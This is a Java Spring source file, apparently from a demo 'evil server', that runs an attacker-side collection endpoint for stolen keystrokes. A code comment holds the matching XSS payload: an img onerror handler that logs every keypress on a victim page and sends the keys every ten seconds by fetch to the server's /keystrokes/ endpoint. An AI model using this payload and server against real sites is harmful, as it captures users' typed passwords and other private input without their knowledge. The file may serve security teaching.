package com.example.springevilserver;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class KeystrokeController {

    private KeystrokeService keystrokeService;

    public KeystrokeController(KeystrokeService keystrokeService){
        this.keystrokeService = keystrokeService;
    }

    @GetMapping("/keystrokes")
    public String showKeystrokes(){
        return this.keystrokeService.toString();
    }

    //<img src=nonexistentImage3 onerror='var keys = [];setInterval(function(){var keyString =keys.join("");fetch("http://localhost:8081/keystrokes/" + keyString)}, 10000);document.onkeypress=function(e){keys.push(e.key)};'/>
    @GetMapping("/keystrokes/{keystrokes}")
    public String addKeystrokes(@PathVariable("keystrokes") String cookie){
        this.keystrokeService.add(cookie);
        System.out.println("Cookie: "+cookie+" added");
        return "";
    }

}
